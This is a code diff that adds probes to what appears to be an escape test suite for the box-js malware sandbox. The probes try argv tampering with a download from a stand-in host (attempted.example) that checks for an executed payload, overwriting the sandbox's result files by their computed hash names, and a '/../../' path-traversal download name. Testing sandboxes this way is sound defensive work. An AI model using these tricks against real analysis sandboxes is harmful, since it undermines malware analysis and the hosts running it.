@@ -38,6 +38,27 @@ attempt("module-shapes", function () {
   // The host module carries members the sandbox's own EventEmitter does not.
   try { if (typeof E.init === "function" || typeof E.usingDomains === "boolean") hit("events-host-module"); } catch (err) {}
 });
+attempt("argv-flags", function () {
+  // The sandbox's argv is a frozen copy: flipping it must not change what the host does.
+  var already = false;
+  try { already = require("./argv.js").run["fake-download"] === true; } catch (err) {}
+  if (already) return; // the run really has --fake-download
+  try { require("./argv.js").run["fake-download"] = true; } catch (err) {}
+  try {
+    var x = new ActiveXObject("MSXML2.XMLHTTP");
+    x.open("GET", "http://attempted.example/argv-fetch", false);
+    x.send();
+    if (String(x.responseText).indexOf("EXECUTED DOWNLOADED PAYLOAD") >= 0) hit("argv-fake-download");
+  } catch (err) {}
+});
+attempt("result-name-overwrite", function () {
+  // box-js saves atob() output as <sha256>.bin; the sample can compute that name.
+  try {
+    atob("cHJvYmUtcGF5bG9hZA==");
+    var h = require("crypto").createHash("sha256").update("probe-payload").digest("hex");
+    lib.logResource(h + ".bin", "C:\\x", "overwritten-by-sample");
+  } catch (err) {}
+});
 attempt("buffer-pool", function () {
   // A pooled Buffer's backing store holds other host data.
   function check(name, b) {
@@ -78,6 +99,9 @@ attempt("download-attribute", function () {
   // must choose neither which file is read nor where it is written.
   try { atob("cHJvYmU="); } catch (err) {}
   try { lastDecodedFile = LEAK; } catch (err) {}
+  // self/global are the host's sandbox object, which the handler used to read this from.
+  try { self.lastDecodedFile = LEAK; } catch (err) {}
+  try { global.lastDecodedFile = LEAK; } catch (err) {}
   try {
     var a = document.createElement("a");
     a.download = "/../../" + MARK.split("/").pop() + ".download-traversal";
